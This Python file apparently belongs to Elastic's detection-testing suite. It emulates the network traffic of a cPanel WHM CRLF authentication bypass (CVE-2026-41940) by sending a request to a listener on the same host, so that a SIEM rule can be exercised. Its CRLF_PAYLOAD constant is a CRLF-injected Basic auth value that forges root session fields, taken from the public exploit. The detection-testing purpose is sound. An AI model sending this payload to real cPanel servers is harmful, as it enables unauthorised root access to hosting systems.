# Copyright Elasticsearch B.V. and/or licensed to Elasticsearch B.V. under one
# or more contributor license agreements. Licensed under the Elastic License
# 2.0; you may not use this file except in compliance with the Elastic License
# 2.0.

# Name: cPanel WHM CRLF Authentication Bypass (Linux)
# RTA: linux_cpanel_whm_crlf_auth_bypass.py
# Description: Emulates the network signature of CVE-2026-41940 by binding an
#              HTTP listener on TCP/2087 (the WHM admin port) on all interfaces
#              (0.0.0.0) that responds to GET / with an HTTP 307 redirect
#              carrying a Location: /cpsess<10-digit>/... header, then issuing
#              a GET / request to the host's non-loopback IP so the transaction
#              traverses the physical interface and is visible to Packetbeat /
#              network_traffic packet capture. The request carries an
#              Authorization: Basic header whose decoded value contains
#              CRLF-injected session fields. The resulting decoded HTTP
#              transaction (network_traffic.http) matches every clause of the
#              CVE-2026-41940 detection rule: GET /, cPanel admin port,
#              Authorization: Basic on the request, 3xx response, /cpsess* in
#              the response Location header.
#
#              TCP/2087 is unprivileged (>1024) so no special capabilities are
#              required. The Network Packet Capture integration must be
#              configured to decode HTTP on TCP/2087 with send_all_headers
#              enabled for the http.request.headers.authorization and
#              http.response.headers.location fields to be populated.

import base64
import http.client
import http.server
import logging
import threading
import time

from . import OSType, RuleMetadata, register_code_rta
from ._common import get_host_ip

log = logging.getLogger(__name__)

WHM_PORT = 2087
CPSESS_LOCATION = "/cpsess1234567890/json-api/version"

# CRLF-injected payload reproduced from the public exploit. Base64-decoding
# the resulting Authorization header value yields a multi-line block delimited
# by \r\n with forged session fields - the smoking gun an analyst would
# inspect when triaging this alert.
CRLF_PAYLOAD = (
    b"root:x\r\n"
    b"successful_internal_auth_with_timestamp=9999999999\r\n"
    b"user=root\r\n"
    b"tfa_verified=1\r\n"
    b"hasroot=1"
)


class _CpanelRedirectHandler(http.server.BaseHTTPRequestHandler):
    """Respond to GET / with HTTP 307 and a /cpsess... Location header."""

    protocol_version = "HTTP/1.1"

    def do_GET(self) -> None:  # noqa: N802 - http.server method name convention
        if self.path != "/":
            self.send_error(404, "Not Found")
            return
        self.send_response(307)
        self.send_header("Location", CPSESS_LOCATION)
        self.send_header("Content-Length", "0")
        self.send_header("Connection", "close")
        self.end_headers()

    def log_message(self, format: str, *args: object) -> None:  # noqa: A002 - http.server signature
        log.debug("listener: " + format, *args)


def _serve_one_request(server: http.server.HTTPServer, ready: threading.Event) -> None:
    ready.set()
    try:
        server.handle_request()
    finally:
        server.server_close()


@register_code_rta(
    id="9893d4fe-ed6c-4d48-be20-a42df6192b65",
    name="linux_cpanel_whm_crlf_auth_bypass",
    platforms=[OSType.LINUX],
    endpoint_rules=[],
    siem_rules=[
        RuleMetadata(
            id="2449be9d-2fdf-4126-a85b-f05e4058df9f",
            name="cPanel WHM CRLF Authentication Bypass (CVE-2026-41940)",
        )
    ],
    techniques=["T1190"],
)
def main() -> None:
    """Emulate Stage 2 of CVE-2026-41940: GET / with Basic auth + 3xx response carrying /cpsess Location."""
    http.server.HTTPServer.allow_reuse_address = True
    try:
        server = http.server.HTTPServer(("0.0.0.0", WHM_PORT), _CpanelRedirectHandler)
    except OSError as e:
        log.error("Could not bind 0.0.0.0:%d (%s)", WHM_PORT, e)
        return

    ready = threading.Event()
    server_thread = threading.Thread(
        target=_serve_one_request, args=(server, ready), daemon=True
    )
    server_thread.start()

    if not ready.wait(timeout=5):
        log.error("Listener on TCP/%d did not start in time", WHM_PORT)
        return

    time.sleep(0.2)

    auth_value = "Basic " + base64.b64encode(CRLF_PAYLOAD).decode("ascii")
    local_ip = get_host_ip()

    log.info(
        "Sending GET / to %s:%d with CRLF-injected Authorization: Basic header",
        local_ip, WHM_PORT,
    )
    conn = http.client.HTTPConnection(local_ip, WHM_PORT, timeout=5)
    try:
        conn.request(
            "GET", "/",
            headers={"Authorization": auth_value, "Connection": "close"},
        )
        resp = conn.getresponse()
        location = resp.getheader("Location")
        log.info(
            "Received HTTP %d from %s:%d with Location: %s",
            resp.status, local_ip, WHM_PORT, location,
        )
        # Drain so the server-side handle_request can return cleanly.
        _ = resp.read()
    except OSError as e:
        log.error("Request to %s:%d failed: %s", local_ip, WHM_PORT, e)
    finally:
        conn.close()

    server_thread.join(timeout=5)
